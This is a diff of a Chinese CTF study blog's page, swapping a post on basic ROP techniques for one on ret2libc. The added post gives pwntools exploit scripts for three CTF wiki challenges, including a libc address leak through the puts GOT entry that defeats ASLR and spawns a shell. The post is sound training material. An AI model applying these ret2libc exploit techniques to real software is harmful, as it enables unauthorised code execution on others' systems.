@@ -79,33 +79,24 @@
 
 
 
-<meta name="description" content="虽然自己选择了病毒分析这个方向，但ctf比赛还是要打的，只做re的话未免太过单一，于是抽出时间来学习一下pwn的基础知识，做点题练练手。第一天主要是接触了pwn中的栈溢出部分的入门知识，也就是对应了ctf wiki上的基本ROP部分，简单的做个总结吧 ret2text原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的">
+<meta name="description" content="昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干 Ret2ilbc首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。 下面就来看ctf wiki给出的三个例题吧，首">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习（1）">
-<meta property="og:url" content="http://yoursite.com/2018/11/18/pwn学习（1）/index.html">
+<meta property="og:title" content="pwn学习（二）">
+<meta property="og:url" content="http://yoursite.com/2018/11/18/pwn学习（二）/index.html">
 <meta property="og:site_name" content="Asa9ao">
-<meta property="og:description" content="虽然自己选择了病毒分析这个方向，但ctf比赛还是要打的，只做re的话未免太过单一，于是抽出时间来学习一下pwn的基础知识，做点题练练手。第一天主要是接触了pwn中的栈溢出部分的入门知识，也就是对应了ctf wiki上的基本ROP部分，简单的做个总结吧 ret2text原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的">
+<meta property="og:description" content="昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干 Ret2ilbc首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。 下面就来看ctf wiki给出的三个例题吧，首">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf138f88b893.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf149a905c1b.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a1323ae9.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a116dcf2.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a12cfb6a.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a1330921.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a11c8291.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a1480f90.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a133cd29.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a1387ef5.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a14928cc.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a970040d.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a96e5b9e.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a978d54f.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14a97391b2.jpg">
-<meta property="og:updated_time" content="2018-11-18T11:20:23.783Z">
+<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d799d6b0.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d79dd2f6.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7a55c91.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7a315ee.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7a36b5a.jpg">
+<meta property="og:updated_time" content="2018-11-18T11:32:16.130Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习（1）">
-<meta name="twitter:description" content="虽然自己选择了病毒分析这个方向，但ctf比赛还是要打的，只做re的话未免太过单一，于是抽出时间来学习一下pwn的基础知识，做点题练练手。第一天主要是接触了pwn中的栈溢出部分的入门知识，也就是对应了ctf wiki上的基本ROP部分，简单的做个总结吧 ret2text原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的">
-<meta name="twitter:image" content="https://i.loli.net/2018/11/18/5bf138f88b893.jpg">
+<meta name="twitter:title" content="pwn学习（二）">
+<meta name="twitter:description" content="昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干 Ret2ilbc首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。 下面就来看ctf wiki给出的三个例题吧，首">
+<meta name="twitter:image" content="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg">
 
 
 
@@ -135,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/18/pwn学习（1）/">
+  <link rel="canonical" href="http://yoursite.com/2018/11/18/pwn学习（二）/">
 
 
 
 
 
-  <title>pwn学习（1） | Asa9ao</title>
+  <title>pwn学习（二） | Asa9ao</title>
   
 
 
@@ -268,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（1）/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（二）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asa9ao">
@@ -285,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习（1）</h1>
+          <h1 class="post-title" itemprop="name headline">pwn学习（二）</h1>
         
 
         <div class="post-meta">
@@ -297,7 +288,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T17:36:37+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T19:25:46+08:00">
                 2018-11-18
               </time>
             
@@ -357,43 +348,110 @@
       
 
       
-        <p>虽然自己选择了病毒分析这个方向，但ctf比赛还是要打的，只做re的话未免太过单一，于是抽出时间来学习一下pwn的基础知识，做点题练练手。第一天主要是接触了pwn中的栈溢出部分的入门知识，也就是对应了ctf wiki上的基本ROP部分，简单的做个总结吧</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的设置返回地址，而我们可以利用程序中的一些“无限制”的读取函数来覆盖掉返回地址，而当我们设置好了合适的大小时，我们就可以将eip随意设置成我们想要执行的函数的地址，而如果这个函数恰恰程序又给我们提供了的话，就实现了ret2text，简单说就是控制程序执行他本身原有的代码。当然，我们进行控制的时候也可以利用“零碎”的代码组成我们想要的，这是后话了。</p>
-<p>例子我们就使用ctf wiki上提供的ret2text，因为是我们的第一个pwn题目，所以我们来仔细进行一下每一步的总结。</p>
-<p>首先我们可以用peda自带的checksec函数来检查程序的保护机制（由于保护机制我后期想深入进行研究所以这里就不再赘述了，之后弄个详细的总结）</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf138f88b893.jpg" alt=""></p>
-<p>可以看到开启了NX（又叫DEP），也就是说栈上的数据不可以被执行了。</p>
-<p>紧接着我们用ida打开简单分析一下程序</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf149a905c1b.jpg" alt="2.jpg"></p>
-<p>很显然gets这里存在栈溢出漏洞，我们可以通过s对于ebp的偏移值直接计算出来我们的ret的地址，当然也可以使用peda中的工具，这里为了熟练一下工具的使用我就用一下工具吧</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1323ae9.jpg" alt="3.jpg"></p>
-<p>通过peda的pattern create xxx可以生成xxx个随机字符，我们就尝试用这个来溢出函数进而找到函数的返回地址（因为返回地址被我们的垃圾数据覆盖了，所以函数无法正常返回，我们就可以通过这一步的错误确定返回地址相对于我们的s的偏移量）</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a116dcf2.jpg" alt="4.jpg"></p>
-<p>使用pattern offset xxx可以查看到相对于xxx的偏移量，当然由于这里算出来的是ebp的，对于堆栈结构已经不陌生的我们就知道了，加4（64位程序+8）也就是我们的返回地址</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a12cfb6a.jpg" alt="5.jpg"></p>
-<p>我们在ida中查看到了程序中自带了system(“/bin/sh”/)函数，那我们直接拿这玩意的地址去填充原来函数的返回地址就好了，那我们就来写exp了</p>
-<p>successful</p>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>在知道了ret2text的原理后这个就很好理解了，之前我们是借助程序提供的可以拿到shell的函数来实现pwn的，那万一程序中没有提供咋办？其实也很简单，我们可以在恰当的位置放上自己的shellcode然后去执行它，当然我们要提前知道我们可以布置shellcode的位置，毕竟我们是要运行这段shellcode，所以起码你放的地方得有执行的权限，比如上面那个题目，开启了NX，你要是把shellcode布置在栈上就完蛋了。</p>
-<p>前期的操作就不再赘述了，我们用ida打开程序进行一下简单的分析</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1330921.jpg" alt="6.jpg"></p>
-<p>主要函数部分如图所示，可以看懂栈溢出很明显，但更有趣的是下边的一句，它将我们的输入的0x64个字符复制到了buf2，我们点进去看看buf2是个什么东西</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a11c8291.jpg" alt="7.jpg"></p>
-<p>可以看到buf2是bss段的一个数组，但按照我们上面说的，我们需要把shellcode布置在有执行权限的地方，而这里是否有执行权限呢？我们可以通过peda的vmmap来看一看</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1480f90.jpg" alt="8.jpg"></p>
-<p>果然这一段是可执行的，那接下来的任务就简单了，只要我们输入shellcode，并且通过最后的返回地址返回到buf2的位置就可以实现pwn，下面是exp</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a133cd29.jpg" alt="9.jpg"></p>
-<p>successful</p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>因为有逆向的基础，所以这个说起来也并不难，主要就是控制程序执行系统调用，关于什么是系统调用就不再提了，可以简单的看做是一个信号弹，这个信号一来系统就知道有事要干了，但具体干什么就由信号弹的颜色啊、声响啊等等各个方面综合决定了。linux中的这个信号弹就是int 80h，基本过程如下图所示</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a1387ef5.jpg" alt="10.jpg"></p>
-<p>而pwn一般都是要去执行/bin/sh的，那就需要用系统调用号为0xb的execve了，这个函数有三个参数，分别用ebx、ecx和edx保存，其中第一个是字符串/bin/sh，其余两个是0。</p>
-<p>那我们如何去控制这几个寄存器的值呢？那就要用到gadgets了，我们利用一个个片段去拼凑出来我们需要的东西，比如，改变eax的值，我们可以用pop eax的方式去实现，只要栈上的值我们提前设置好就成了，那如何找到这些gadgets呢？我们可以利用ROPgadget这个工具</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a14928cc.jpg" alt="11.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a970040d.jpg" alt="12.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a96e5b9e.jpg" alt="13.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a978d54f.jpg" alt="14.jpg"></p>
-<p>万事具备，只欠脚本！</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14a97391b2.jpg" alt="15.jpg"></p>
-<p>这里要注意我们的flat里面需要有一定的顺序，可以认为就是个放到的栈结构，最上面的是我们的系统调用，前面对于eax和其余三个寄存器的pop操则可以更换顺序（毕竟都是到int_80才开始使用的，前面的顺序也就无关紧要了）</p>
+        <p>昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干</p>
+<h2 id="Ret2ilbc"><a href="#Ret2ilbc" class="headerlink" title="Ret2ilbc"></a>Ret2ilbc</h2><p>首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。</p>
+<p>下面就来看ctf wiki给出的三个例题吧，首先是第一个</p>
+<p><img src="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg" alt="1.jpg"></p>
+<p>很显然gets处存在栈溢出漏洞，紧接着我们来看看程序给我们“提供”了什么可以利用的点</p>
+<p><img src="https://i.loli.net/2018/11/18/5bf14d799d6b0.jpg" alt="2.jpg"></p>
+<p><img src="https://i.loli.net/2018/11/18/5bf14d79dd2f6.jpg" alt="3.jpg"></p>
+<p>可以看到程序非常大方的给了我们/bin/sh的字符串和system函数，那任务就结束了，我们只需要溢出s将函数的返回地址设置为system的地址，紧接着将system的参数设置为字符串的地址即可，直接上脚本了</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
+
+p = process(<span class="string">'./ret2libc1.dms'</span>)
+
+system = <span class="number">0x8048460</span>
+
+bin = <span class="number">0x08048720</span>
+
+payload = flat([<span class="string">'a'</span>\*<span class="number">112</span>,system,<span class="string">'b'</span>\*<span class="number">4</span>],bin)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>注意，我们的system作为我们将要返回的函数，他自然也有要返回的函数，因为我们只需要拿到sh，所以他具体返回什么我们就不用操心了，所以直接拿4个b把他的返回地址给填充掉就好了。当然，这是我们手动找到了system函数的地址，是不是还有其他的办法呢？当然有了，脚本一改</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
+
+p = process(<span class="string">'./ret2libc1.dms'</span>)
+
+elf = ELF(<span class="string">'./ret2libc1.dms'</span>)
+
+system\_addr = elf.plt[<span class="string">'system'</span>]
+
+bin\_addr = <span class="number">0x8048720</span>
+
+payload = <span class="number">112</span>\*<span class="string">'a'</span> + p32(system\_addr) +<span class="string">'b'</span>\*<span class="number">4</span> + p32(bin\_addr)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>这里我们使用了ELF加载了我们的程序，而ELF的plt中就是保存着我们的地址与函数的一一映射，因此我们用plt[‘system’]就可以拿到system的地址了</p>
+<p>紧接着看第二个题目</p>
+<p><img src="https://i.loli.net/2018/11/18/5bf14d7a55c91.jpg" alt="4.jpg"></p>
+<p>溢出点还是gets函数，但这次就没有第一次那么简单了，虽然还有system函数，但是没有可以供我们使用的/bin/sh字符串了，这时候我们就要开动脑筋想一想了，毛爷爷说过，没有条件创造条件，他没给字符串，我们可不可以自己输入一个进去呢？我们抓紧来看一下</p>
+<p><img src="https://i.loli.net/2018/11/18/5bf14d7a315ee.jpg" alt="5.jpg"></p>
+<p>首先就是天时啊，程序有个gets的函数，那我们何不借东风？拿它来一招瞒天过海？</p>
+<p><img src="https://i.loli.net/2018/11/18/5bf14d7a36b5a.jpg" alt="6.jpg"></p>
+<p>其次地利也有啊，bss段又个0x64长度的buf2数组没被用过，刚好我们瞒天过海而来的字符串就由它再暗度陈仓了。天时地利，就差exp了</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
+
+p = process(<span class="string">'./ret2libc2.dms'</span>)
+
+elf = ELF(<span class="string">'./ret2libc2.dms'</span>)
+
+gets\_addr = elf.plt[<span class="string">'gets'</span>]
+
+system\_addr = elf.plt[<span class="string">'system'</span>]
+
+pop\_ebx = <span class="number">0x0804843d</span>
+
+buf2 = <span class="number">0x804A080</span>
+
+payload = <span class="number">112</span>\*<span class="string">'a'</span> + p32(gets\_addr) + p32(pop\_ebx) + p32(buf2) + p32(system\_addr) + <span class="number">4</span>\*<span class="string">'a'</span> + p32(buf2)
+
+p.sendline(payload)
+
+p.sendline(<span class="string">"/bin/sh"</span>)
+
+p.interactive()
+</code></pre>
+<p>这里简单提一句为什么会有个pop ebx，主要是gets函数其实是改变了堆栈状态的，我们这里使用了pop主要是为了平衡堆栈的，你pop谁都可以，add也行。</p>
+<p>趁热打铁把第三题也做了，这个题比起上面的两个题难度系数高了很多，这次是既没有了system函数也没有了/bin/sh，那就比较麻烦了，我们要找的东西可就多了。不过有个好消息就是我们的system函数是属于libc，而libc.so里函数的相对偏移是一定的，更让人高兴的是即使程序ASLR的保护，也只是针对地址的中间位进行随机，最低的12位并不会发生改变，而这些github上都有人把工作给我们做好了，我们只需要知道一个函数在libc的地址，就可以顺藤摸瓜搞到所有函数（甚至还有字符串/bin/sh）的地址，这样就人工创造了天时地利，只差我们的exp了</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
+
+<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher
+
+p = process(<span class="string">'./ret2libc3.dms'</span>)
+
+e = ELF(<span class="string">'./ret2libc3.dms'</span>)
+
+puts\_plt = e.plt[<span class="string">'puts'</span>]
+
+puts\_got = e.got[<span class="string">'puts'</span>]
+
+main = e.symbols[<span class="string">'main'</span>]
+
+p.recv()
+
+p.sendline(flat([<span class="string">'A'</span> \* <span class="number">0x70</span>, puts\_plt, main, puts\_got]))
+
+puts\_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])
+
+libc = LibcSearcher(<span class="string">'puts'</span>, puts\_addr)
+
+libcbase = puts\_addr - libc.dump(<span class="string">'puts'</span>)
+
+system\_addr = libcbase + libc.dump(<span class="string">'system'</span>)
+
+binsh\_addr = libcbase + libc.dump(<span class="string">'str\_bin\_sh'</span>)
+
+p.sendline(flat([<span class="string">'A'</span> \* <span class="number">104</span>, system\_addr, <span class="string">'b'</span>\*<span class="number">4</span>, binsh\_addr]))
+
+p.interactive()
+</code></pre>
+<p>这里用到了新的工具—LibcSearcher，这个工具主要是能够帮助我们轻松的利用已有的got表的泄漏快速找到我们想要的东西，用法也很简单LibcSeacher(‘函数名’,地址)得到了libc，之后libc.dump()就可以得到偏移了，之后按照之前的方法构造payload就好了。要注意这里我们的pad要-8，因为我们是在main函数里又调用了main函数。</p>
 <p>successful</p>
 
       
@@ -419,14 +477,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/11/18/pwn学习（1）/" rel="next" title="pwn学习（1）">
+                <i class="fa fa-chevron-left"></i> pwn学习（1）
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/11/18/pwn学习（二）/" rel="prev" title="pwn学习（二）">
-                pwn学习（二） <i class="fa fa-chevron-right"></i>
+              <a href="/2018/11/18/pwn学习（3）ROP-Emporium32位练习/" rel="prev" title="pwn学习（3）ROP Emporium32位练习">
+                pwn学习（3）ROP Emporium32位练习 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -550,7 +612,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.</span> <span class="nav-text">ret2syscall</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ret2ilbc"><span class="nav-number">1.</span> <span class="nav-text">Ret2ilbc</span></a></li></ol></div>
             
 
           </div>
